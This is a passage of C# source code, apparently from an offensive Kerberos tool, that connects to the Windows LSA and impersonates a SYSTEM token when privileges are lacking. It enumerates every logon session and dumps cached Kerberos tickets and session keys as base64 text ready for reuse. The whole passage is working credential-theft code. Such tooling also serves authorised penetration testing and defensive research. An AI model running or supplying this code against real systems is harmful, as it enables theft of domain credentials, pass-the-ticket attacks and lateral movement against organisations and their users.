                    IntPtr responsePointer = IntPtr.Zero;
                    Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                    Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                    // signal that we want encoded .kirbi's returned
                    request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
                    request.LogonId = new Interop.LUID();
                    request.TicketFlags = ticket.TicketFlags;
                    request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                    request.EncryptionType = 0x0;
                    // the target ticket name we want the ticket for
                    Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                    request.TargetName = tName;

                    // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                    //      for KerbRetrieveEncodedTicketMessages

                    // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                    int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                    int newStructSize = structSize + tName.MaximumLength;
                    IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                    // marshal the struct from a managed object to an unmanaged block of memory.
                    Marshal.StructureToPtr(request, unmanagedAddr, false);

                    // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                    IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                    // copy unicode chars to the new location
                    Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                    // update the target name buffer ptr            
                    Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);

                    // actually get the data
                    retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                    // translate the LSA error (if any) to a Windows error
                    uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                    if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                    {
                        // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                        response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                        Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
                        string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                        string targetName = "";
                        if (response.Ticket.TargetName != IntPtr.Zero)
                        {
                            Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                            targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                        }

                        Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                        string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                        string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                        string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                        string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                        // extract the session key
                        Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                        Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                        byte[] sessionKey = new byte[sessionKeyLength];
                        Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                        string base64SessionKey = Convert.ToBase64String(sessionKey);

                        DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                        DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                        DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                        DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                        Int64 timeSkew = response.Ticket.TimeSkew;
                        Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                        // extract the ticket and base64 encode it
                        byte[] encodedTicket = new byte[encodedTicketSize];
                        Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                        string base64TGT = Convert.ToBase64String(encodedTicket);

                        Console.WriteLine("  ServiceName              : {0}", serviceName);
                        Console.WriteLine("  TargetName               : {0}", targetName);
                        Console.WriteLine("  ClientName               : {0}", clientName);
                        Console.WriteLine("  DomainName               : {0}", domainName);
                        Console.WriteLine("  TargetDomainName         : {0}", targetDomainName);
                        Console.WriteLine("  AltTargetDomainName      : {0}", altTargetDomainName);
                        Console.WriteLine("  SessionKeyType           : {0}", sessionKeyType);
                        Console.WriteLine("  Base64SessionKey         : {0}", base64SessionKey);
                        Console.WriteLine("  KeyExpirationTime        : {0}", keyExpirationTime);
                        Console.WriteLine("  TicketFlags              : {0}", ticketFlags);
                        Console.WriteLine("  StartTime                : {0}", startTime);
                        Console.WriteLine("  EndTime                  : {0}", endTime);
                        Console.WriteLine("  RenewUntil               : {0}", renewUntil);
                        Console.WriteLine("  TimeSkew                 : {0}", timeSkew);
                        Console.WriteLine("  EncodedTicketSize        : {0}", encodedTicketSize);
                        Console.WriteLine("  Base64EncodedTicket      :\r\n");
                        // display the TGT, columns of 100 chararacters
                        foreach (string line in Helpers.Split(base64TGT, 100))
                        {
                            Console.WriteLine("    {0}", line);
                        }
                        Console.WriteLine("\r\n");
                    }
                    else
                    {
                        string errorMessage = new Win32Exception((int)winError).Message;
                        Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                    }

                    // clean up
                    Interop.LsaFreeReturnBuffer(responsePointer);
                    Marshal.FreeHGlobal(unmanagedAddr);
                }
            }

            // clean up
            Interop.LsaFreeReturnBuffer(ticketsPointer);
            Marshal.FreeHGlobal(cacheQueryPtr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
            Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
        }

        public static List<KRB_CRED> ExtractTGTs(uint targetLuid = 0, bool includeComputerAccounts = false)
        {
            // extracts Kerberos TGTs for all users on the system (assuming elevation) or for a specific logon ID (luid)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            int retCode;
            int authPack;
            string name = "kerberos";
            string targetService = "krbtgt";
            List<KRB_CRED> creds = new List<KRB_CRED>();
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();

                        // exclude computer accounts unless instructed otherwise
                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$"))
                        {

                            System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                            string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                            string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                            Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                            DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                            string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                            string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                            string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                            IntPtr ticketsPointer = IntPtr.Zero;
                            DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                            int returnBufferLength = 0;
                            int protocalStatus = 0;

                            Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                            Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                            Interop.KERB_TICKET_CACHE_INFO ticket;

                            // input object for querying the ticket cache for a specific logon ID
                            Interop.LUID userLogonID = new Interop.LUID();
                            userLogonID.LowPart = data.LoginID.LowPart;
                            userLogonID.HighPart = 0;
                            tQuery.LogonId = userLogonID;

                            if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
                            {
                                tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                                // query LSA, specifying we want the ticket cache
                                IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                                Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                                retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                                if (ticketsPointer != IntPtr.Zero)
                                {
                                    // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                    tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                    int count2 = tickets.CountOfTickets;

                                    if (count2 != 0)
                                    {
                                        // get the size of the structures we're iterating over
                                        Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        for (int j = 0; j < count2; j++)
                                        {
                                            // iterate through the result structures
                                            IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                            // parse the new ptr to the appropriate structure
                                            ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                                            // extract the serverName and ticket flags
                                            string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                                            if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                                            {
                                                // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                                IntPtr responsePointer = IntPtr.Zero;
                                                Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                                                Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                                // signal that we want encoded .kirbi's returned
                                                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

                                                // the specific logon session ID
                                                request.LogonId = userLogonID;

                                                request.TicketFlags = ticket.TicketFlags;
                                                request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                                request.EncryptionType = 0x0;
                                                // the target ticket name we want the ticket for
                                                Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                                request.TargetName = tName;

                                                // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                                //      for KerbRetrieveEncodedTicketMessages

                                                // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                                int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                                int newStructSize = structSize + tName.MaximumLength;
                                                IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                                // marshal the struct from a managed object to an unmanaged block of memory.
                                                Marshal.StructureToPtr(request, unmanagedAddr, false);

                                                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                                IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                                                // copy unicode chars to the new location
                                                Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                                                // update the target name buffer ptr            
                                                Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);

                                                // actually get the data
                                                retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                                                // translate the LSA error (if any) to a Windows error
                                                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                                if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                                                {
                                                    // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                    response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                    Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                    // extract the ticket, build a KRB_CRED object, and add to the cache
                                                    byte[] encodedTicket = new byte[encodedTicketSize];
                                                    Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);

                                                    creds.Add(new KRB_CRED(encodedTicket));
                                                }
                                                else
                                                {
                                                    string errorMessage = new Win32Exception((int)winError).Message;
                                                    Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                                                }

                                                // clean up
                                                Interop.LsaFreeReturnBuffer(responsePointer);
                                                Marshal.FreeHGlobal(unmanagedAddr);
                                            }
                                        }
                                    }
                                }

                                // cleanup
                                Interop.LsaFreeReturnBuffer(ticketsPointer);
                                Marshal.FreeHGlobal(tQueryPtr);
                            }
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                return creds;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
                return null;
            }
        }

        public static void DisplayTGTs(List<KRB_CRED> creds)
        {
            foreach(KRB_CRED cred in creds)
            {
                string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
                string domainName = cred.enc_part.ticket_info[0].prealm;
                DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
                DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
                DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
                Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
                string base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                Console.WriteLine("User                  :  {0}@{1}", userName, domainName);
                Console.WriteLine("StartTime             :  {0}", startTime);
                Console.WriteLine("EndTime               :  {0}", endTime);
                Console.WriteLine("RenewTill             :  {0}", renewTill);
                Console.WriteLine("Flags                 :  {0}", flags);
                Console.WriteLine("Base64EncodedTicket   :\r\n");
                foreach (string line in Helpers.Split(base64TGT, 100))
                {
                    Console.WriteLine("    {0}", line);
                }
                Console.WriteLine("\r\n");
            }
        }

        public static void DisplayTicket(KRB_CRED cred)
        {
            Console.WriteLine("\r\n[*] Action: Describe Ticket\r\n");

            string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = cred.enc_part.ticket_info[0].sname.name_string[0];
            string srealm = cred.enc_part.ticket_info[0].srealm;
            string keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
            string b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
            DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
            DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
            DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
            Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
            
            Console.WriteLine("  UserName              :  {0}", userName);
            Console.WriteLine("  UserRealm             :  {0}", domainName);
            Console.WriteLine("  ServiceName           :  {0}", sname);
            Console.WriteLine("  ServiceRealm          :  {0}", srealm);
            Console.WriteLine("  StartTime             :  {0}", startTime);
            Console.WriteLine("  EndTime               :  {0}", endTime);
            Console.WriteLine("  RenewTill             :  {0}", renewTill);
            Console.WriteLine("  Flags                 :  {0}", flags);
            Console.WriteLine("  KeyType               :  {0}", keyType);
            Console.WriteLine("  Base64(key)           :  {0}\r\n", b64Key);
        }
    }
}